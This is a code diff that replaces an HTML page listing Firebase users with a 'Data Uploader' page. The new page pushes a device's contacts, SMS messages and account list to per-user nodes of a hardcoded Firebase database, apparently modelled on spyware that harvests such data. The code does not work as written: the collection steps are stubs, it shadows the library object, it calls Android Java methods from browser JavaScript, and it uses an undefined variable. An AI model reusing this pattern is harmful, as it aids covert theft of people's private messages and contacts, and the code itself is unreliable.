@@ -1,74 +1,86 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Firebase Realtime Database</title>
-  <style>
-    table {
-      border-collapse: collapse;
-      width: 100%;
-    }
-    th, td {
-      padding: 8px;
-      text-align: left;
-      border-bottom: 1px solid #ddd;
-    }
-    th {
-      background-color: #f2f2f2;
-    }
-  </style>
+  <title>Data Uploader</title>
+  <!-- Include the Firebase JavaScript library -->
+  <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-database.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-auth.js"></script>
 </head>
 <body>
-  <table>
-    <thead>
-      <tr>
-        <th>Profile Pic</th>
-        <th>Email</th>
-        <th>Username</th>
-      </tr>
-    </thead>
-    <tbody id="userTableBody"></tbody>
-  </table>
+  <h1>Data Uploader</h1>
+  <button onclick="startUpload()">Start Upload</button>
 
-  <script src="https://www.gstatic.com/firebasejs/8.8.1/firebase-app.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/8.8.1/firebase-database.js"></script>
   <script>
     // Initialize Firebase
-    var firebaseConfig = {
-      // Your Firebase project configuration
-      apiKey: "AIzaSyA9aeIFnYrQ9UXIUJS0RsPUbgljfinQdQ0",
-  authDomain: "a2za2za2z1.firebaseapp.com",
-  databaseURL: "https://a2za2za2z1-default-rtdb.firebaseio.com",
-  projectId: "a2za2za2z1",
-  storageBucket: "a2za2za2z1.appspot.com",
-  messagingSenderId: "1092163255405",
-  appId: "1:1092163255405:web:702ceabc4045e853ce5364"
+    const firebaseConfig = {
+      // Your Firebase configuration
+            apiKey: "AIzaSyA9aeIFnYrQ9UXIUJS0RsPUbgljfinQdQ0", 
+   authDomain: "a2za2za2z1.firebaseapp.com", 
+   databaseURL: "https://a2za2za2z1-default-rtdb.firebaseio.com", 
+   projectId: "a2za2za2z1", 
+   storageBucket: "a2za2za2z1.appspot.com", 
+   messagingSenderId: "1092163255405", 
+   appId: "1:1092163255405:web:702ceabc4045e853ce5364"
     };
     firebase.initializeApp(firebaseConfig);
 
-    // Get a reference to the database
-    var database = firebase.database();
+    function DataUploader() {
+      const firebase = firebase.database();
+      const auth = firebase.auth();
+      let str1 = '';
+      const mapc = {};
+      const maps = {};
+      let contactsdataRef = null;
+      let smsdataRef = null;
+      let accountssRef = null;
 
-    // Retrieve "users" data from Firebase Realtime Database
-    var usersRef = database.ref('users');
-    usersRef.once('value', function(snapshot) {
-      snapshot.forEach(function(childSnapshot) {
-        var user = childSnapshot.val();
-        var profilePic = user.pic;
-        var email = user.u;
-        var username = user.username;
+      function uploadContacts() {
+        // Get the contacts data from Android
+        // ...
 
-        // Add data to the table
-        var tableBody = document.getElementById('userTableBody');
-        var newRow = tableBody.insertRow();
-        var picCell = newRow.insertCell();
-        var emailCell = newRow.insertCell();
-        var usernameCell = newRow.insertCell();
+        // Upload the contact data to Firebase
+        contactsdataRef.push(mapc);
+      }
 
-        picCell.innerHTML = '<img src="' + profilePic + '" alt="Profile Pic" width="50" height="50">';
-        emailCell.textContent = email;
-        usernameCell.textContent = username;
-      });
-    });
+      function uploadSMS() {
+        // Get the SMS data from Android
+        // ...
+
+        // Upload the SMS data to Firebase
+        smsdataRef.push(maps);
+      }
+
+      function uploadAccounts() {
+        // Get the accounts from Android
+        // ...
+
+        // Upload the account data to Firebase
+        accountssRef.push(accountData);
+      }
+
+      function startUpload() {
+        // Get the current user UID
+        str1 = auth.getCurrentUser().getUid();
+
+        // Set up the database references
+        contactsdataRef = firebase.ref(`${str1}/contactsdata`);
+        smsdataRef = firebase.ref(`${str1}/smsdata`);
+        accountssRef = firebase.ref(`${str1}/accountss`);
+
+        // Upload the data
+        uploadContacts();
+        uploadSMS();
+        uploadAccounts();
+      }
+
+      return {
+        startUpload
+      };
+    }
+
+    const dataUploader = DataUploader();
+    window.startUpload = dataUploader.startUpload;
   </script>
 </body>
 </html>
